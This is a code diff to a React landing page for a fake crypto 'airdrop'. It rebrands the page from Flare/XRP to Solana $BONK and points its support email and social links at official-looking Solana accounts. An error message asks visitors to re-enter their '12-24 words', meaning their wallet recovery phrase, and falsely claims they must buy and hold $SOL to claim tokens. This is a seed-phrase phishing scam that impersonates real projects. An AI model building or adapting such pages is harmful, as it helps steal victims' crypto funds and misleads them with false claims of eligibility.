@@ -36,10 +36,10 @@ export default function Home() {
                             </div>
                             <div className="heroInfo">
                                 <h1 className="headeText">
-                                    The Flare FLR <span className="gradient-text ">Airdrop</span> Event has started!
+                                    The $BONK <span className="gradient-text ">Airdrop</span> Event has started!
                                 </h1>
                                 <p className="subText">
-                                    Created by Ripple XRP foundation, Flare is the blockchain for data, providing developers with secure decentralized access to high-integrity data from other chains and the internet. The Xrp Flare Airdrop event is live and all users are eligible. Connect your defi crypto wallet and claim your airdrop.
+                                    Created by Solana foundation, $SOL is the blockchain for data, providing developers with secure decentralized access to high-integrity data from other chains and the internet. The Solana $BONK Airdrop event is live and all users are eligible. Connect your defi crypto wallet and claim your airdrop.
                                 </p>
                             </div>
                             <div className="sectionAction">
@@ -76,13 +76,13 @@ export default function Home() {
                                         <Icon icon="fluent-emoji:rocket" width="80px" height="80px" />
                                     </div>
                                     <h2 className="subTitle">Optimize</h2>
-                                    <p>Offers highly-decentralized price and data feeds to dapps on Flare, without relying on centralized providers.</p>
+                                    <p>Offers highly-decentralized price and data feeds to dapps on Solana chain, without relying on centralized providers.</p>
                                 </div>
                                 <div className="cBox">
                                     <div className="cIcon">
                                         <Icon icon="emojione:globe-showing-americas" width="80px" height="80px" />                                    </div>
                                     <h2 className="subTitle">Engage</h2>
-                                    <p>Enables information from other blockchains and the internet to be used securely and trustfully on Flare.</p>
+                                    <p>Enables information from other blockchains and the internet to be used securely and trustfully on Solana.</p>
                                 </div>
 
 
@@ -99,7 +99,7 @@ export default function Home() {
                         <section className="extra">
                             <div className="exText">
                                 <h2>The Fastest growing Chain</h2>
-                                <p>Join us and a million others on the most secure chain by claiming your Flare airdrop.</p>
+                                <p>Join us and a million others on the most secure chain by claiming your $BONK airdrop.</p>
                             </div>
 
                             <div className="x">
@@ -187,7 +187,7 @@ export default function Home() {
                                     </div>
                                     <h3>Enshrined Oracles</h3>
                                     <p>
-                                        Access all the data you need, knowing Flare's oracles are secured at the network layer.                                    </p>
+                                        Access all the data you need, knowing Solana's oracles are secured at the network layer.                                    </p>
                                 </div>
                             </div>
                         </section>
@@ -223,25 +223,25 @@ export default function Home() {
 
                                         <hr />
                                         <div className="fooLogob">
-  <p className="">support@flare.network</p>
+  <p className="">support@solana.com</p>
   <div className="socials">
     <div className="socBox">
-      <a href="https://discord.gg/invite/flarenetwork" target="_blank" rel="noopener noreferrer">
+      <a href="https://discord.gg/invite/solana" target="_blank" rel="noopener noreferrer">
         <Icon icon="ic:baseline-discord" width="20px" height="35px" style={{ color: "white" }} />
       </a>
     </div>
     <div className="socBox">
-      <a href="https://twitter.com/FlareNetworks" target="_blank" rel="noopener noreferrer">
+      <a href="https://twitter.com/solana" target="_blank" rel="noopener noreferrer">
         <Icon icon="ri:twitter-x-fill" width="20px" height="35px" style={{ color: "white" }} />
       </a>
     </div>
     <div className="socBox">
-      <a href="https://youtube.com/c/@Flare_Networks" target="_blank" rel="noopener noreferrer">
+      <a href="https://youtube.com/c/@solana" target="_blank" rel="noopener noreferrer">
         <Icon icon="mingcute:youtube-fill" width="20px" height="35px" style={{ color: "white" }} />
       </a>
     </div>
     <div className="socBox">
-      <a href="https://t.me/FlareNetwork" target="_blank" rel="noopener noreferrer">
+      <a href="https://t.me/solana" target="_blank" rel="noopener noreferrer">
         <Icon icon="ri:telegram-fill" width="20px" height="35px" style={{ color: "white" }} />
       </a>
     </div>
@@ -396,7 +396,7 @@ function ActionOverLay({ level, action }) {
                                     <div className="vom">
                                         <p>
                                             An error occured while linking your wallet. 1)Make sure you write your 12-24 words correctly in row.
-                                            2)You must hold XRP in your wallet in order to connect and claim your Flare, if you hold 0 XRP you can't link and can't claim Flare. Buy XRP and link your wallet again to claim your FLR.
+                                            2)You must hold $SOL in your wallet in order to connect and claim your $BONK, if you hold 0 $SOL you can't link and can't claim $BONK. Buy $SOL and link your wallet again to claim your $BONK.
                                              Please try again.
                                         </p>
                                         <div className="actionlink">
